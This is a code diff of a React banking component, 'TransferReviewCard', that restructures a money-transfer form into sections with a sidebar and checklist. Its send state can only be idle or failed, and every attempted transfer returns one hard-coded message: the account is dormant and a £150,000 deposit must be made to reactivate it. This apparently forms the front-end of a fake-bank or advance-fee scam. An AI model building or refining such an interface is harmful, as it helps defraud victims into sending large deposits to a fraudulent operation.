@@ -3,62 +3,76 @@
 import { useEffect, useRef, useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
-import { Input } from "@/components/ui/input";
 
 export type TransferField = {
   label: string;
   placeholder?: string;
   type?: string;
+  control?: "input" | "textarea";
   options?: string[];
   hint?: string;
   fullWidth?: boolean;
   defaultValue?: string;
   required?: boolean;
+  rows?: number;
+};
+
+export type TransferSection = {
+  title: string;
+  description: string;
+  fields: TransferField[];
+};
+
+type TransferContextItem = {
+  label: string;
+  value: string;
+  detail: string;
 };
 
 type TransferReviewCardProps = {
   title: string;
   description: string;
-  fields: TransferField[];
+  sections: TransferSection[];
   submitLabel: string;
+  contextItems?: TransferContextItem[];
+  checklist?: string[];
 };
 
 type SendState = "idle" | "failed";
 
-function buildInitialValues(fields: TransferField[]) {
+function getAllFields(sections: TransferSection[]) {
+  return sections.flatMap((section) => section.fields);
+}
+
+function buildInitialValues(sections: TransferSection[]) {
   const nextValues: Record<string, string> = {};
 
-  for (const field of fields) {
+  for (const field of getAllFields(sections)) {
     nextValues[field.label] = field.defaultValue ?? "";
   }
 
   return nextValues;
 }
 
-function buildFailureReason(fields: TransferField[]) {
-  if (fields.some((field) => field.label === "SWIFT / BIC")) {
-    return "This transfer could not be completed because the account has been dormant for a long time. A deposit of £150,000 must be made into the account to remove it from its dormant state.";
-  }
-
-  if (fields.some((field) => field.label === "To account")) {
-    return "This transfer could not be completed because the account has been dormant for a long time. A deposit of £150,000 must be made into the account to remove it from its dormant state.";
-  }
-
+function buildFailureReason() {
   return "This transfer could not be completed because the account has been dormant for a long time. A deposit of £150,000 must be made into the account to remove it from its dormant state.";
 }
 
 export function TransferReviewCard({
   title,
   description,
-  fields,
+  sections,
   submitLabel,
+  contextItems = [],
+  checklist = [],
 }: TransferReviewCardProps) {
-  const [values, setValues] = useState<Record<string, string>>(() => buildInitialValues(fields));
+  const [values, setValues] = useState<Record<string, string>>(() => buildInitialValues(sections));
   const [reviewError, setReviewError] = useState("");
   const [showPreview, setShowPreview] = useState(false);
   const [isSending, setIsSending] = useState(false);
   const [sendState, setSendState] = useState<SendState>("idle");
   const timeoutRef = useRef<number | null>(null);
+  const allFields = getAllFields(sections);
 
   useEffect(() => {
     return () => {
@@ -74,11 +88,17 @@ export function TransferReviewCard({
     values["To account"] ||
     values["IBAN / Account"] ||
     values["Account number"] ||
+    values["Beneficiary bank"] ||
     "Selected recipient";
   const fromAccount = values["From account"];
-  const failureReason = buildFailureReason(fields);
+  const failureReason = buildFailureReason();
 
-  const previewFields = fields.filter((field) => values[field.label]?.trim());
+  const previewSections = sections
+    .map((section) => ({
+      ...section,
+      fields: section.fields.filter((field) => values[field.label]?.trim()),
+    }))
+    .filter((section) => section.fields.length);
 
   function updateField(label: string, value: string) {
     setValues((current) => ({
@@ -100,7 +120,7 @@ export function TransferReviewCard({
   }
 
   function handleReview() {
-    const hasMissingRequiredValue = fields.some(
+    const hasMissingRequiredValue = allFields.some(
       (field) => (field.required ?? true) && !values[field.label]?.trim(),
     );
 
@@ -133,65 +153,170 @@ export function TransferReviewCard({
   return (
     <>
       <Card description={description} title={title}>
-        <form
-          className="grid gap-4 sm:grid-cols-2"
-          onSubmit={(event) => {
-            event.preventDefault();
-            handleReview();
-          }}
-        >
-          {fields.map((field) => {
-            if (field.options) {
-              return (
-                <label
-                  key={field.label}
-                  className={`block text-sm text-stone-700 ${field.fullWidth ? "sm:col-span-2" : ""}`}
-                >
-                  <span className="font-medium text-stone-900">{field.label}</span>
-                  <select
-                    className="input-field"
-                    onChange={(event) => updateField(field.label, event.target.value)}
-                    value={values[field.label] ?? ""}
-                  >
-                    {field.options.map((option) => (
-                      <option key={option} value={option}>
-                        {option}
-                      </option>
-                    ))}
-                  </select>
-                  {field.hint ? (
-                    <span className="mt-2 block text-xs text-stone-500">{field.hint}</span>
-                  ) : null}
-                </label>
-              );
-            }
+        <div className="grid gap-6 xl:grid-cols-[minmax(0,1fr)_18rem]">
+          <form
+            className="space-y-5"
+            onSubmit={(event) => {
+              event.preventDefault();
+              handleReview();
+            }}
+          >
+            {sections.map((section) => (
+              <section key={section.title} className="surface-muted p-5 sm:p-6">
+                <div className="border-b border-[#ead8da] pb-4">
+                  <p className="eyebrow">{section.title}</p>
+                  <p className="mt-2 text-sm leading-7 text-stone-600">{section.description}</p>
+                </div>
 
-            return (
-              <Input
-                key={field.label}
-                hint={field.hint}
-                label={field.label}
-                onChange={(event) => updateField(field.label, event.target.value)}
-                placeholder={field.placeholder}
-                type={field.type ?? "text"}
-                value={values[field.label] ?? ""}
-                wrapperClassName={field.fullWidth ? "sm:col-span-2" : ""}
-              />
-            );
-          })}
+                <div className="mt-5 grid gap-4 sm:grid-cols-2">
+                  {section.fields.map((field) => {
+                    const wrapperClassName = field.fullWidth ? "sm:col-span-2" : "";
+                    const optional = field.required === false;
 
-          {reviewError ? (
-            <p className="rounded-2xl border border-[#d8b8bb] bg-[#fcf5f6] px-4 py-3 text-sm text-[#7a1c22] sm:col-span-2">
-              {reviewError}
-            </p>
-          ) : null}
+                    if (field.options) {
+                      return (
+                        <label
+                          key={field.label}
+                          className={`block text-sm text-stone-700 ${wrapperClassName}`}
+                        >
+                          <div className="flex items-center gap-2">
+                            <span className="font-medium text-stone-900">{field.label}</span>
+                            {optional ? (
+                              <span className="text-[10px] uppercase tracking-[0.24em] text-stone-400">
+                                Optional
+                              </span>
+                            ) : null}
+                          </div>
+                          <select
+                            className="input-field"
+                            onChange={(event) => updateField(field.label, event.target.value)}
+                            value={values[field.label] ?? ""}
+                          >
+                            {field.placeholder && !field.defaultValue ? (
+                              <option disabled value="">
+                                {field.placeholder}
+                              </option>
+                            ) : null}
+                            {field.options.map((option) => (
+                              <option key={option} value={option}>
+                                {option}
+                              </option>
+                            ))}
+                          </select>
+                          {field.hint ? (
+                            <span className="mt-2 block text-xs leading-6 text-stone-500">
+                              {field.hint}
+                            </span>
+                          ) : null}
+                        </label>
+                      );
+                    }
 
-          <div className="pt-2 sm:col-span-2">
-            <Button size="lg" type="submit">
-              {submitLabel}
-            </Button>
-          </div>
-        </form>
+                    if (field.control === "textarea") {
+                      return (
+                        <label key={field.label} className={`block text-sm text-stone-700 ${wrapperClassName}`}>
+                          <div className="flex items-center gap-2">
+                            <span className="font-medium text-stone-900">{field.label}</span>
+                            {optional ? (
+                              <span className="text-[10px] uppercase tracking-[0.24em] text-stone-400">
+                                Optional
+                              </span>
+                            ) : null}
+                          </div>
+                          <textarea
+                            className="input-field min-h-32 resize-none"
+                            onChange={(event) => updateField(field.label, event.target.value)}
+                            placeholder={field.placeholder}
+                            rows={field.rows ?? 4}
+                            value={values[field.label] ?? ""}
+                          />
+                          {field.hint ? (
+                            <span className="mt-2 block text-xs leading-6 text-stone-500">
+                              {field.hint}
+                            </span>
+                          ) : null}
+                        </label>
+                      );
+                    }
+
+                    return (
+                      <label key={field.label} className={`block text-sm text-stone-700 ${wrapperClassName}`}>
+                        <div className="flex items-center gap-2">
+                          <span className="font-medium text-stone-900">{field.label}</span>
+                          {optional ? (
+                            <span className="text-[10px] uppercase tracking-[0.24em] text-stone-400">
+                              Optional
+                            </span>
+                          ) : null}
+                        </div>
+                        <input
+                          className="input-field"
+                          onChange={(event) => updateField(field.label, event.target.value)}
+                          placeholder={field.placeholder}
+                          type={field.type ?? "text"}
+                          value={values[field.label] ?? ""}
+                        />
+                        {field.hint ? (
+                          <span className="mt-2 block text-xs leading-6 text-stone-500">
+                            {field.hint}
+                          </span>
+                        ) : null}
+                      </label>
+                    );
+                  })}
+                </div>
+              </section>
+            ))}
+
+            {reviewError ? (
+              <p className="rounded-2xl border border-[#d8b8bb] bg-[#fcf5f6] px-4 py-3 text-sm text-[#7a1c22]">
+                {reviewError}
+              </p>
+            ) : null}
+
+            <div className="flex flex-col gap-3 rounded-[1.5rem] border border-stone-200/80 bg-stone-50 px-4 py-4 sm:flex-row sm:items-center sm:justify-between">
+              <p className="text-sm leading-7 text-stone-600">
+                Review completes a final check on beneficiary details, payment purpose, and available funds before release.
+              </p>
+              <Button size="lg" type="submit">
+                {submitLabel}
+              </Button>
+            </div>
+          </form>
+
+          <aside className="space-y-4">
+            {contextItems.length ? (
+              <div className="surface-muted p-5">
+                <p className="eyebrow">Transfer Controls</p>
+                <div className="mt-4 space-y-4">
+                  {contextItems.map((item) => (
+                    <div key={item.label} className="rounded-[1.2rem] bg-white/80 px-4 py-4">
+                      <p className="text-[11px] uppercase tracking-[0.22em] text-stone-400">
+                        {item.label}
+                      </p>
+                      <p className="mt-2 text-base font-medium text-stone-950">{item.value}</p>
+                      <p className="mt-1 text-sm leading-6 text-stone-600">{item.detail}</p>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            ) : null}
+
+            {checklist.length ? (
+              <div className="surface-muted p-5">
+                <p className="eyebrow">Before You Send</p>
+                <div className="mt-4 space-y-3">
+                  {checklist.map((item) => (
+                    <div key={item} className="flex gap-3 rounded-[1.2rem] bg-white/80 px-4 py-4">
+                      <span className="mt-1 h-2.5 w-2.5 rounded-full bg-accent" />
+                      <p className="text-sm leading-7 text-stone-700">{item}</p>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            ) : null}
+          </aside>
+        </div>
       </Card>
 
       {showPreview ? (
@@ -235,18 +360,27 @@ export function TransferReviewCard({
                 <p className="text-2xl text-accent-deep">{previewAmount}</p>
               </div>
 
-              <div className="mt-4 space-y-3">
-                {previewFields.map((field) => (
-                  <div
-                    key={field.label}
-                    className="flex items-start justify-between gap-4 rounded-[1.1rem] bg-white/80 px-3 py-3"
-                  >
-                    <p className="text-xs uppercase tracking-[0.2em] text-stone-400">
-                      {field.label}
+              <div className="mt-4 space-y-4">
+                {previewSections.map((section) => (
+                  <div key={section.title}>
+                    <p className="text-[11px] uppercase tracking-[0.22em] text-stone-400">
+                      {section.title}
                     </p>
-                    <p className="max-w-[15rem] text-right text-sm font-medium text-stone-950">
-                      {values[field.label]}
-                    </p>
+                    <div className="mt-2 space-y-3">
+                      {section.fields.map((field) => (
+                        <div
+                          key={field.label}
+                          className="flex items-start justify-between gap-4 rounded-[1.1rem] bg-white/80 px-3 py-3"
+                        >
+                          <p className="text-xs uppercase tracking-[0.2em] text-stone-400">
+                            {field.label}
+                          </p>
+                          <p className="max-w-[15rem] text-right text-sm font-medium text-stone-950">
+                            {values[field.label]}
+                          </p>
+                        </div>
+                      ))}
+                    </div>
                   </div>
                 ))}
               </div>
